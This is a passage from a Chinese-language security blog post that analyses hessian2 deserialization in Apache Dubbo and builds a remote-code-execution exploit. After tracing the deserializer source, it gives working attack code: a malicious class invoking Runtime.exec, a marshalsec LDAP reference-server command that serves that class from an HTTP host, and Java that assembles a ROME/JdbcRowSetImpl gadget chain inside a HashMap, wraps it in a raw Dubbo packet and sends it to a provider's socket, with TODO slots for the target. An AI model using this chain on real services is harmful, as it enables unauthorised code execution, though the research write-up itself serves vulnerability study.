<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...           .G.2.0.20,com.threedr3am.learn.server.boot.DemoService.1.0.hello0$Lcom/threedr3am/learn/server/boot/A;C0&quot;com.threedr3am.learn.server.boot.A..name`.xxxxH.path0,com.threedr3am.learn.server.boot.DemoService.activelimit_filter_start_time 1577081623564 interface0,com.threedr3am.learn.server.boot.DemoService.version.1.0.timeout.3000Z</span><br></pre></td></tr></table></figure>
<ul>
<li>.G.2.0.20：dubbo版本</li>
<li>com.threedr3am.learn.server.boot.DemoService：path</li>
<li>1.0：version</li>
<li>hello0：方法名</li>
<li>Lcom/threedr3am/learn/server/boot/A;：方法描述</li>
</ul>
<p>hessian-tag：</p>
<ul>
<li>C：类定义</li>
<li>H：键值对</li>
<li>…具体细节也不详细描述</li>
</ul>
<p>其实，我们只要知道了dubbo协议请求的数据结构组成，那么，我们就能随意创建数据包，去进行反序列化攻击。</p>
<p>但是，对hessian2反序列化，有一个关键的细节，就是对于类的反射构造实例化，会有比较大的限制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">case &apos;C&apos;: &#123;</span><br><span class="line">    readObjectDefinition(expectedClass);</span><br><span class="line"></span><br><span class="line">    return readObject(expectedClass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void readObjectDefinition(Class cl)</span><br><span class="line">        throws IOException &#123;</span><br><span class="line">    String type = readString();</span><br><span class="line">    int len = readInt();</span><br><span class="line"></span><br><span class="line">    String[] fieldNames = new String[len];</span><br><span class="line">    for (int i = 0; i &lt; len; i++)</span><br><span class="line">        fieldNames[i] = readString();</span><br><span class="line"></span><br><span class="line">    ObjectDefinition def = new ObjectDefinition(type, fieldNames);</span><br><span class="line"></span><br><span class="line">    if (_classDefs == null)</span><br><span class="line">        _classDefs = new ArrayList();</span><br><span class="line"></span><br><span class="line">    _classDefs.add(def);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从前面所说的数据包，以及C这个tag的含义，我们可以看到，数据包的反序列化，会先对方法传入参数对应的class，进行类定义的读取，接着</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">case 0x60:</span><br><span class="line">case 0x61:</span><br><span class="line">case 0x62:</span><br><span class="line">case 0x63:</span><br><span class="line">case 0x64:</span><br><span class="line">case 0x65:</span><br><span class="line">case 0x66:</span><br><span class="line">case 0x67:</span><br><span class="line">case 0x68:</span><br><span class="line">case 0x69:</span><br><span class="line">case 0x6a:</span><br><span class="line">case 0x6b:</span><br><span class="line">case 0x6c:</span><br><span class="line">case 0x6d:</span><br><span class="line">case 0x6e:</span><br><span class="line">case 0x6f: &#123;</span><br><span class="line">    int ref = tag - 0x60;</span><br><span class="line">    int size = _classDefs.size();</span><br><span class="line"></span><br><span class="line">    if (ref &lt; 0 || size &lt;= ref)</span><br><span class="line">        throw new HessianProtocolException(&quot;&apos;&quot; + ref + &quot;&apos; is an unknown class definition&quot;);</span><br><span class="line"></span><br><span class="line">    ObjectDefinition def = (ObjectDefinition) _classDefs.get(ref);</span><br><span class="line"></span><br><span class="line">    return readObjectInstance(expectedClass, def);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进行实例的反序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">private Object readObjectInstance(Class cl, ObjectDefinition def)</span><br><span class="line">        throws IOException &#123;</span><br><span class="line">    String type = def.getType();</span><br><span class="line">    String[] fieldNames = def.getFieldNames();</span><br><span class="line"></span><br><span class="line">    if (cl != null) &#123;</span><br><span class="line">        Deserializer reader;</span><br><span class="line">        reader = findSerializerFactory().getObjectDeserializer(type, cl);</span><br><span class="line"></span><br><span class="line">        return reader.readObject(this, fieldNames);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return findSerializerFactory().readObject(this, type, fieldNames);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<figure class="highlight plain"><figcaption><span>type </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">因为反序列化的是java类，因此，Deserializer的实现为com.alibaba.com.caucho.hessian.io.JavaDeserializer，跟进其构造方法，可以看到：</span><br></pre></td></tr></table></figure></p>
<p>public JavaDeserializer(Class cl) {<br>    _type = cl;<br>    _fieldMap = getFieldMap(cl);</p>
<pre><code>_readResolve = getReadResolve(cl);

if (_readResolve != null) {
    _readResolve.setAccessible(true);
}

Constructor[] constructors = cl.getDeclaredConstructors();
long bestCost = Long.MAX_VALUE;

for (int i = 0; i &lt; constructors.length; i++) {
    Class[] param = constructors[i].getParameterTypes();
    long cost = 0;

    for (int j = 0; j &lt; param.length; j++) {
        cost = 4 * cost;

        if (Object.class.equals(param[j]))
            cost += 1;
        else if (String.class.equals(param[j]))
            cost += 2;
        else if (int.class.equals(param[j]))
            cost += 3;
        else if (long.class.equals(param[j]))
            cost += 4;
        else if (param[j].isPrimitive())
            cost += 5;
        else
            cost += 6;
    }

    if (cost &lt; 0 || cost &gt; (1 &lt;&lt; 48))
        cost = 1 &lt;&lt; 48;

    cost += (long) param.length &lt;&lt; 48;

    if (cost &lt; bestCost) {
        _constructor = constructors[i];
        bestCost = cost;
    }
}

if (_constructor != null) {
    _constructor.setAccessible(true);
    Class[] params = _constructor.getParameterTypes();
    _constructorArgs = new Object[params.length];
    for (int i = 0; i &lt; params.length; i++) {
        _constructorArgs[i] = getParamArg(params[i]);
    }
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以看到，构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法，而这，就是hessian2反序列化中最大的限制。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终执行其reader.readObject(this, fieldNames)方法，完成类的反射方式实例化</span><br></pre></td></tr></table></figure></p>
<p>@Override<br>public Object readObject(AbstractHessianInput in, String[] fieldNames)<br>        throws IOException {<br>    try {<br>        Object obj = instantiate();</p>
<pre><code>    return readObject(in, obj, fieldNames);
} catch (IOException e) {
    throw e;
} catch (RuntimeException e) {
    throw e;
} catch (Exception e) {
    throw new IOExceptionWrapper(_type.getName() + &quot;:&quot; + e.getMessage(), e);
}
</code></pre><p>}</p>
<p>protected Object instantiate()<br>        throws Exception {<br>    try {<br>        if (_constructor != null)<br>            return _constructor.newInstance(_constructorArgs);<br>        else<br>            return _type.newInstance();<br>    } catch (Exception e) {<br>        throw new HessianProtocolException(“‘“ + _type.getName() + “‘ could not be instantiated”, e);<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">并在实例化后，把字段值设置进去</span><br></pre></td></tr></table></figure></p>
<p>public Object readObject(AbstractHessianInput in,<br>                         Object obj,<br>                         String[] fieldNames)<br>        throws IOException {<br>    try {<br>        int ref = in.addRef(obj);</p>
<pre><code>    for (int i = 0; i &lt; fieldNames.length; i++) {
        String name = fieldNames[i];

        FieldDeserializer deser = (FieldDeserializer) _fieldMap.get(name);

        if (deser != null)
            deser.deserialize(in, obj);
        else
            in.readObject();
    }

    Object resolve = resolve(obj);

    if (obj != resolve)
        in.setRef(ref, resolve);

    return resolve;
} catch (IOException e) {
    throw e;
} catch (Exception e) {
    throw new IOExceptionWrapper(obj.getClass().getName() + &quot;:&quot; + e, e);
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 四、反序列化利用(hessian2)</span><br><span class="line"></span><br><span class="line">在上一节中，详细的描述了dubbo默认的hessian2反序列化，通过上一节，我们也清楚的理解了hessian2的反序列化大概源码执行流程，以及其反序列化攻击的利用限制。</span><br><span class="line"></span><br><span class="line">对其整理一下：</span><br><span class="line">1. 默认dubbo协议+hessian2序列化方式</span><br><span class="line">2. 序列化tcp包可随意修改方法参数反序列化的class</span><br><span class="line">3. 反序列化时先通过构造方法实例化，然后在反射设置字段值</span><br><span class="line">4. 构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法</span><br><span class="line"></span><br><span class="line">由此，想要rce，估计得找到以下条件的gadget clain：</span><br><span class="line">1. 有参构造方法</span><br><span class="line">2. 参数不包含非基本类型</span><br><span class="line">3. cost最小的构造方法并且全部都是基本类型或String</span><br><span class="line"></span><br><span class="line">这样的利用条件太苛刻了，不过万事没绝对，参考marshalsec，可以利用rome依赖使用HashMap触发key的hashCode方法的gadget chain来打，以下是对hessian2反序列化map的源码跟踪：</span><br></pre></td></tr></table></figure></p>
<p>@Override<br>@SuppressWarnings(“unchecked”)<br>public <t> T readObject(Class<t> cls) throws IOException,<br>        ClassNotFoundException {<br>    return (T) mH2i.readObject(cls);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></t></t></p>
<p>@Override<br>public Object readObject(Class cl)<br>        throws IOException {<br>    return readObject(cl, null, null);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
<p>@Override<br>public Object readObject(Class expectedClass, Class&lt;?&gt;… expectedTypes) throws IOException {<br>    //…<br>    switch (tag) {<br>        //…<br>        case ‘H’: {<br>            Deserializer reader = findSerializerFactory().getDeserializer(expectedClass);</p>
<pre><code>        boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.length == 2;
        // fix deserialize of short type
        return reader.readMap(this
                , keyValuePair ? expectedTypes[0] : null
                , keyValuePair ? expectedTypes[1] : null);
    }
    //...    
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
<p>@Override<br>public Object readMap(AbstractHessianInput in, Class&lt;?&gt; expectKeyType, Class&lt;?&gt; expectValueType) throws IOException {<br>    Map map;</p>
<pre><code>if (_type == null)
    map = new HashMap();
else if (_type.equals(Map.class))
    map = new HashMap();
else if (_type.equals(SortedMap.class))
    map = new TreeMap();
else {
    try {
        map = (Map) _ctor.newInstance();
    } catch (Exception e) {
        throw new IOExceptionWrapper(e);
    }
}

in.addRef(map);

doReadMap(in, map, expectKeyType, expectValueType);

in.readEnd();

return map;
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
<p>protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException {<br>    Deserializer keyDeserializer = null, valueDeserializer = null;</p>
<pre><code>SerializerFactory factory = findSerializerFactory(in);
if(keyType != null){
    keyDeserializer = factory.getDeserializer(keyType.getName());
}
if(valueType != null){
    valueDeserializer = factory.getDeserializer(valueType.getName());
}

while (!in.isEnd()) {
    map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(),
            valueDeserializer != null? valueDeserializer.readObject(in) : in.readObject());
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">从上面贴出来的部分执行栈信息，可以清晰的看到，最终在反序列化中实例化了新的HashMap，然后把反序列化出来的实例put进去，因此，会触发key的hashCode方法。</span><br><span class="line"></span><br><span class="line">创建gadget chain：</span><br><span class="line"></span><br><span class="line">- 具有rome依赖的gadget chain</span><br><span class="line"></span><br><span class="line">依赖</span><br></pre></td></tr></table></figure></p>
<p><dependency><br>  <groupid>com.rometools</groupid><br>  <artifactid>rome</artifactid><br>  <version>1.7.0</version><br></dependency><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">创建恶意class，放到http服务器（80端口）</span><br></pre></td></tr></table></figure></p>
<p>public class ExecObject {<br>    static {<br>        try {<br>            Runtime.getRuntime().exec(“/System/Applications/Calculator.app/Contents/MacOS/Calculator”);<br>        } catch (IOException e) {<br>            e.printStackTrace();<br>        }<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动ldap服务</span><br></pre></td></tr></table></figure></p>
<p>java -jar marshalsec.jar marshalsec.jndi.LDAPRefServer <a href="http://127.0.0.1:80/#ExecObject" target="_blank" rel="noopener">http://127.0.0.1:80/#ExecObject</a> 44321<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload</span><br></pre></td></tr></table></figure></p>
<p>JdbcRowSetImpl rs = new JdbcRowSetImpl();<br>//todo 此处填写ldap url<br>rs.setDataSourceName(“ldap://127.0.0.1:43658/ExecObject”);<br>rs.setMatchColumn(“foo”);<br>Reflections.getField(javax.sql.rowset.BaseRowSet.class, “listeners”).set(rs, null);</p>
<p>ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);<br>EqualsBean root = new EqualsBean(ToStringBean.class, item);</p>
<p>HashMap s = new HashMap&lt;&gt;();<br>Reflections.setFieldValue(s, “size”, 2);<br>Class&lt;?&gt; nodeC;<br>try {<br>  nodeC = Class.forName(“java.util.HashMap$Node”);<br>}<br>catch ( ClassNotFoundException e ) {<br>  nodeC = Class.forName(“java.util.HashMap$Entry”);<br>}<br>Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);<br>nodeCons.setAccessible(true);</p>
<p>Object tbl = Array.newInstance(nodeC, 2);<br>Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));<br>Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));<br>Reflections.setFieldValue(s, “table”, tbl);</p>
<p>ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</p>
<p>// header.<br>byte[] header = new byte[16];<br>// set magic number.<br>Bytes.short2bytes((short) 0xdabb, header);<br>// set request and serialization flag.<br>header[2] = (byte) ((byte) 0x80 | 2);</p>
<p>// set request id.<br>Bytes.long2bytes(new Random().nextInt(100000000), header, 4);</p>
<p>ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();<br>Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);</p>
<p>out.writeUTF(“2.0.2”);<br>//todo 此处填写注册中心获取到的service全限定名、版本号、方法名<br>out.writeUTF(“com.threedr3am.learn.server.boot.DemoService”);<br>out.writeUTF(“1.0”);<br>out.writeUTF(“hello”);<br>//todo 方法描述不需要修改，因为此处需要指定map的payload去触发<br>out.writeUTF(“Ljava/util/Map;”);<br>out.writeObject(s);<br>out.writeObject(new HashMap());</p>
<p>out.flushBuffer();<br>if (out instanceof Cleanable) {<br>  ((Cleanable) out).cleanup();<br>}</p>
<p>Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);<br>byteArrayOutputStream.write(header);<br>byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());</p>
<p>byte[] bytes = byteArrayOutputStream.toByteArray();</p>
<p>//todo 此处填写被攻击的dubbo服务提供者地址和端口<br>Socket socket = new Socket(“127.0.0.1”, 20880);<br>OutputStream outputStream = socket.getOutputStream();<br>outputStream.write(bytes);<br>outputStream.flush();<br>outputStream.close();<br><code>`</code></p>
<p>我这里把gadget chain的demo放在github上，感兴趣的可以clone下来试试：<a href="https://github.com/threedr3am/learnjavabug" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug</a></p>
<p>具体代码位于com.threedr3am.bug.dubbo包下</p>
<ul>
<li>其它gadget chain<br>除了rome外，还有其它的gadget chains，例如resin、xbean、spring aop等等，这里就不写出来了。</li>
</ul>
<p>也可以参考我修改过的marshalsec，已在下面加入了dubbo下dubbo协议默认hessian2反序列化利用的exploit：<a href="https://github.com/threedr3am/marshalsec" target="_blank" rel="noopener">https://github.com/threedr3am/marshalsec</a></p>
<hr>
<p>声明：本文经安全客授权发布，转载请联系安全客平台。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/dubbo/" rel="tag"># dubbo</a>
          
            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
          
            <a href="/tags/hessian2/" rel="tag"># hessian2</a>
          
            <a href="/tags/dubbo协议/" rel="tag"># dubbo协议</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/01/29/Fastjson反序列化RCE核心-四个关键点分析/" rel="next" title="Fastjson反序列化RCE核心-四个关键点分析">
                <i class="fa fa-chevron-left"></i> Fastjson反序列化RCE核心-四个关键点分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/9999/12/31/学习与生活/" rel="prev" title="学习与生活">
                学习与生活 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg" alt="threedr3am">
            
              <p class="site-author-name" itemprop="name">threedr3am</p>
              <p class="site-description motion-element" itemprop="description">菜到如此</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/threedr3am" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://rui0.cn/" title="ruilin" target="_blank">ruilin</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.leadroyal.cn/" title="leadroyal(卓卓师傅)" target="_blank">leadroyal(卓卓师傅)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.kingkk.com/" title="kingkk" target="_blank">kingkk</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://driverxdw.github.io/" title="in0va'S(dw大鸽)" target="_blank">in0va'S(dw大鸽)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://gengzongyuan.github.io/" title="大树先生(测试大牛)" target="_blank">大树先生(测试大牛)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://chensem.github.io/" title="chensem(逆向龙哥)" target="_blank">chensem(逆向龙哥)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://meizjm3i.github.io/" title="梅子酒" target="_blank">梅子酒</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.orange.tw/" title="orange" target="_blank">orange</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、前言"><span class="nav-number">1.</span> <span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、源码浅析"><span class="nav-number">2.</span> <span class="nav-text">二、源码浅析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-简单使用"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 简单使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-1-启动注册中心（zookeeper）"><span class="nav-number">2.1.1.</span> <span class="nav-text">2.1.1 启动注册中心（zookeeper）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-2-服务端"><span class="nav-number">2.1.2.</span> <span class="nav-text">2.1.2 服务端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-3-客户端"><span class="nav-number">2.1.3.</span> <span class="nav-text">2.1.3 客户端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-4-RPC"><span class="nav-number">2.1.4.</span> <span class="nav-text">2.1.4 RPC</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-源码跟踪"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 源码跟踪</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、hessian2反序列化"><span class="nav-number">3.</span> <span class="nav-text">三、hessian2反序列化</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">threedr3am</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
